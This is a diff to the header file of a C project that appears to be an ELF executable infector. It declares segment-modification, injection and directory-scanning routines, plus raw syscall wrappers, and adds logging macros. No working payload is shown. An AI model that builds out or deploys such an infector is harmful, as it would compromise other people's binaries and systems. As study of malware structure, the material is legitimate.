@@ -17,6 +17,16 @@
 #include <elf.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// LOGGER 
+////////////////////////////////////////////////////////////////////////////////
+
+int g_fd;
+
+#define LOG(x) dprintf(g_fd, "%s(%d)\t= %s(%s)\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
+#define ERR(x) dprintf(g_fd, "\033[0;31m%s(%d)\t= %s(%s)\033[0m\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
+#define OK(x) dprintf(g_fd, "\033[0;32m%s(%d)\t= %s(%s)\033[0m\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
+
+////////////////////////////////////////////////////////////////////////////////
 /// DEFINES
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -32,6 +42,8 @@
 #define DIR_MAX 12
 
 #define BUFF_SIZE 1024*1024*5
+
+#define VOID __attribute__((unused))
 
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
@@ -55,14 +67,15 @@ struct directory
 
 struct elf
 {
+	int fd;
 	void *ptr;
 	unsigned long long size;
 
 	Elf64_Phdr *note;
 	Elf64_Phdr *data;
 
-	unsigned long long addr_padding;
-	unsigned long long offs_padding;
+	int addr_padding;
+	int offs_padding;
 };
 
 struct criteria
@@ -87,10 +100,11 @@ void modify_segments(struct elf *file);
 void modify_header(struct elf *file);
 
 // INJECT_C
-void inject(const struct elf *file, const char *filename);
+void inject(const struct elf *file);
 
 // FILE_C
 struct elf get_file(const char *str);
+void release_file(struct elf *file);
 
 // INLINE_C
 int _open(const char *pathname, int flags, long mode);
@@ -101,7 +115,6 @@ int _stat(const char *pathname, struct stat *statbuf);
 int _getuid(void);
 void *_mmap(void *addr, unsigned long length, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
 int _munmap(void *addr, unsigned long length);
-int _rename(const char *oldpath, const char *newpath);
 
 // UTILS_C
 unsigned long _strlen(const char *str);
